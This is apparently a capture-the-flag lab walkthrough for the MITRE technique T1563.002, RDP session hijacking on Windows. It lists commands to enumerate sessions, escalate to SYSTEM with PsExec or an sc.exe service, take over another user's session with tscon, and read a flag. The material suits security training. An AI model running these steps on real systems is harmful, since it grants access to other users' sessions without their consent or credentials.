# T1563.002 – RDP Session Hijacking | Solution Walkthrough
**Difficulty:** Hard | **OS:** Windows | **MITRE:** T1563.002

## Background
RDP Session Hijacking uses `tscon.exe` to take over another user's active RDP session
**without knowing their password** — attackers only need SYSTEM privileges.

## Step 1 – List Active Sessions
```cmd
qwinsta
# or:
query session
# SESSIONNAME  USERNAME     ID  STATE   TYPE
# console      player       1   Active
# rdp-tcp#0    victim_rdp   2   Active  ← victim session!
```

## Step 2 – Escalate to SYSTEM (Prerequisite)
```powershell
# Via PsExec (if available):
PsExec.exe -s cmd.exe
# Via sc.exe service trick:
sc create sys_shell binpath= "cmd.exe /k whoami > C:\Users\Public\sys_check.txt"
sc start sys_shell
# Verify SYSTEM:
whoami  # nt authority\system
```

## Step 3 – Hijack Session
```cmd
REM As SYSTEM — hijack session ID 2 (victim_rdp):
tscon 2 /dest:console
REM OR connect to it:
tscon 2 /password:""
REM You now see victim_rdp's desktop!
```

## Step 4 – Retrieve Flag
```cmd
REM Inside hijacked session:
type C:\Windows\System32\flag_T1563_002.txt
REM HACKTIFY{RDP_HIJACK_<hostname>}
```

## Why No Password Needed?
`tscon.exe` as SYSTEM bypasses Windows Terminal Services authentication.
This is a documented Windows behavior, not a vulnerability.
